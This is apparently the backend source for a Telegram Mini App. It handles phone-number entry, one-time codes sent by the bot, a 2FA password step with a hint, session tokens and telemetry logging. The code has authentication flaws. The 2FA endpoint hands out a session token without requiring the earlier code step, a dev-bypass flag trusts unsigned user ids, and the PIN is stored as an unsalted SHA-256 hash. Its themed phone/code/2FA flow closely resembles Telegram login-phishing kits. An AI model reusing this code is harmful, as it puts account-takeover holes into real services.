/**
 * Cloudflare Pages Functions API Backend + D1 Database Session Management
 * Handles all /api/* routes on the same domain as the Vue 3 frontend.
 */

function jsonResponse(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: {
      "Content-Type": "application/json",
      "Access-Control-Allow-Origin": "*",
      "Access-Control-Allow-Headers": "Content-Type, X-Telegram-Init-Data",
      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
    },
  });
}

async function hmacSha256(keyBytes, message) {
  const cryptoKey = await crypto.subtle.importKey(
    "raw",
    keyBytes,
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"]
  );
  const sig = await crypto.subtle.sign("HMAC", cryptoKey, new TextEncoder().encode(message));
  return new Uint8Array(sig);
}

function toHex(bytes) {
  return Array.from(bytes)
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
}

/**
 * Verifies Telegram WebApp initData signature using BOT_TOKEN
 */
async function verifyTelegramInitData(initData, botToken) {
  if (!initData || !botToken) return null;
  const params = new URLSearchParams(initData);
  const hash = params.get("hash");
  if (!hash) return null;

  params.delete("hash");
  const dataCheckString = Array.from(params.entries())
    .sort(([a], [b]) => a.localeCompare(b))
    .map(([k, v]) => `${k}=${v}`)
    .join("\n");

  const secretKey = await hmacSha256(new TextEncoder().encode("WebAppData"), botToken);
  const computedHash = toHex(await hmacSha256(secretKey, dataCheckString));

  if (computedHash !== hash) return null;

  const userRaw = params.get("user");
  return userRaw ? JSON.parse(userRaw) : null;
}

async function sha256Hex(text) {
  const digest = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  return toHex(new Uint8Array(digest));
}

function generateOtpCode() {
  const arr = new Uint32Array(1);
  crypto.getRandomValues(arr);
  return String(100000 + (arr[0] % 900000));
}

function generateSessionToken() {
  const bytes = new Uint8Array(24);
  crypto.getRandomValues(bytes);
  return toHex(bytes);
}

async function sendTelegramOtpMessage(botToken, chatId, code) {
  if (!botToken || !chatId) return;
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: `Your Mini App verification code is: *${code}*\nValid for 5 minutes.`,
      parse_mode: "Markdown",
    }),
  }).catch(() => {});
}

export async function onRequest(context) {
  const { request, env } = context;
  const url = new URL(request.url);
  const path = url.pathname;

  if (request.method === "OPTIONS") {
    return jsonResponse({ ok: true });
  }

  if (path === "/api/health") {
    return jsonResponse({ ok: true, service: "tg-vue3-pinia-pages-api" });
  }

  let body = {};
  if (request.method === "POST") {
    body = await request.json().catch(() => ({}));
  }

  // Telemetry / client error endpoints (do not block on auth)
  if (path === "/api/client-error") {
    if (env.DB) {
      await env.DB.prepare(
        `INSERT INTO client_errors (bot_id, tg_id, where_loc, message, stack, url, ua)
         VALUES (?, ?, ?, ?, ?, ?, ?)`
      )
        .bind(
          String(body.bot_id || ""),
          String(body.user_tg?.id || ""),
          String(body.where || ""),
          String(body.message || ""),
          String(body.stack || ""),
          String(body.url || ""),
          String(body.ua || "")
        )
        .run()
        .catch(() => {});
    }
    return jsonResponse({ ok: true });
  }

  if (path === "/api/stats/visit" || path === "/api/stats/action") {
    if (env.DB) {
      await env.DB.prepare(
        `INSERT INTO activity_logs (bot_id, tg_id, event_type, action_name, value, valid, user_agent)
         VALUES (?, ?, ?, ?, ?, ?, ?)`
      )
        .bind(
          String(body.bot_id || ""),
          String(body.tg_id || ""),
          path.endsWith("visit") ? "visit" : "action",
          String(body.action || ""),
          String(body.value || ""),
          body.valid ?? null,
          String(body.user_agent || "")
        )
        .run()
        .catch(() => {});
    }
    return jsonResponse({ ok: true });
  }

  // Verify Telegram WebApp initData signature
  const initData = request.headers.get("X-Telegram-Init-Data") || "";
  let verifiedUser = await verifyTelegramInitData(initData, env.BOT_TOKEN);

  if (!verifiedUser && env.ALLOW_DEV_BYPASS === "true" && body.user_tg?.id) {
    verifiedUser = body.user_tg;
  }

  if (!verifiedUser) {
    return jsonResponse({ ok: false, error: "Invalid or missing Telegram initData signature" }, 401);
  }

  if (!env.DB) {
    return jsonResponse({ ok: false, error: "D1 database binding (DB) is not configured" }, 500);
  }

  const tgId = String(verifiedUser.id);
  const botId = String(body.bot_id || "default");

  // Ensure user row exists
  await env.DB.prepare(
    `INSERT OR IGNORE INTO users (tg_id, first_name, last_name, username, bot_id, state)
     VALUES (?, ?, ?, ?, ?, 'need_phone')`
  )
    .bind(
      tgId,
      String(verifiedUser.first_name || ""),
      String(verifiedUser.last_name || ""),
      String(verifiedUser.username || ""),
      botId
    )
    .run();

  const userRow = await env.DB.prepare(`SELECT * FROM users WHERE tg_id = ?`).bind(tgId).first();

  if (path === "/api/get-bot" || path === "/api/get-state") {
    return jsonResponse({
      ok: true,
      u_id: userRow.id,
      state: userRow.state,
      phone_number: userRow.phone_number,
      password_hint: userRow.twofa_hint,
      session_token: userRow.state === "end" ? userRow.session_token : "",
    });
  }

  if (path === "/api/template") {
    const tpl =
      (await env.DB.prepare(`SELECT * FROM bot_templates WHERE bot_id = ?`).bind(botId).first()) ||
      (await env.DB.prepare(`SELECT * FROM bot_templates WHERE bot_id = 'default'`).first());

    let parsedSteps = {};
    try {
      parsedSteps = tpl?.config_json ? JSON.parse(tpl.config_json) : {};
    } catch {}

    return jsonResponse({
      ok: true,
      template: {
        color: tpl?.color || "default",
        backgroundUrl: tpl?.background_url || "",
        backgroundBlur: tpl?.background_blur || 0,
        ...parsedSteps,
      },
    });
  }

  if (path === "/api/send-code" || path === "/api/send-code-new-phone") {
    const phone = String(body.phone_number || "").trim();
    if (!phone) {
      return jsonResponse({ ok: false, error: "Phone number is required" }, 400);
    }
    const otp = generateOtpCode();
    const expiresAt = Date.now() + 5 * 60 * 1000;

    await env.DB.prepare(
      `UPDATE users
       SET phone_number = ?, otp_code = ?, otp_expires_at = ?, state = 'enter_code', updated_at = CURRENT_TIMESTAMP
       WHERE tg_id = ?`
    )
      .bind(phone, otp, expiresAt, tgId)
      .run();

    await sendTelegramOtpMessage(env.BOT_TOKEN, tgId, otp);

    return jsonResponse({ ok: true });
  }

  if (path === "/api/enter-code") {
    if (body.resend) {
      const otp = generateOtpCode();
      const expiresAt = Date.now() + 5 * 60 * 1000;
      await env.DB.prepare(
        `UPDATE users SET otp_code = ?, otp_expires_at = ?, updated_at = CURRENT_TIMESTAMP WHERE tg_id = ?`
      )
        .bind(otp, expiresAt, tgId)
        .run();
      await sendTelegramOtpMessage(env.BOT_TOKEN, tgId, otp);
      return jsonResponse({ ok: true, resent: true });
    }

    const inputCode = String(body.code || "").trim();
    if (!userRow.otp_code || inputCode !== userRow.otp_code) {
      return jsonResponse({ ok: false, error: "Invalid verification code" }, 400);
    }
    if (Date.now() > Number(userRow.otp_expires_at || 0)) {
      await env.DB.prepare(`UPDATE users SET state = 'expired' WHERE tg_id = ?`).bind(tgId).run();
      return jsonResponse({ ok: false, error: "Code expired. Please request a new code." }, 400);
    }

    if (Number(userRow.twofa_enabled) === 1) {
      await env.DB.prepare(
        `UPDATE users SET otp_code = '', state = 'enter_twoFA', updated_at = CURRENT_TIMESTAMP WHERE tg_id = ?`
      )
        .bind(tgId)
        .run();
      return jsonResponse({
        ok: true,
        next_state: "enter_twoFA",
        password_hint: userRow.twofa_hint || "",
      });
    }

    const token = generateSessionToken();
    await env.DB.prepare(
      `UPDATE users
       SET otp_code = '', state = 'end', session_token = ?, updated_at = CURRENT_TIMESTAMP
       WHERE tg_id = ?`
    )
      .bind(token, tgId)
      .run();

    return jsonResponse({ ok: true, next_state: "end", session_token: token });
  }

  if (path === "/api/enter-pass") {
    const pass = String(body.password || "");
    const passHash = await sha256Hex(pass);

    if (userRow.twofa_pin_hash && passHash !== userRow.twofa_pin_hash) {
      return jsonResponse({ ok: false, error: "Incorrect 2FA password/PIN" }, 400);
    }

    const token = generateSessionToken();
    await env.DB.prepare(
      `UPDATE users SET state = 'end', session_token = ?, updated_at = CURRENT_TIMESTAMP WHERE tg_id = ?`
    )
      .bind(token, tgId)
      .run();

    return jsonResponse({ ok: true, session_token: token });
  }

  if (path === "/api/wrong-number") {
    await env.DB.prepare(
      `UPDATE users SET phone_number = '', otp_code = '', state = 'need_phone', updated_at = CURRENT_TIMESTAMP WHERE tg_id = ?`
    )
      .bind(tgId)
      .run();
    return jsonResponse({ ok: true, state: "need_phone" });
  }

  if (path === "/api/logout") {
    await env.DB.prepare(
      `UPDATE users SET session_token = '', state = 'need_phone', updated_at = CURRENT_TIMESTAMP WHERE tg_id = ?`
    )
      .bind(tgId)
      .run();
    return jsonResponse({ ok: true, state: "need_phone" });
  }

  return jsonResponse({ ok: false, error: "Endpoint not found" }, 404);
}
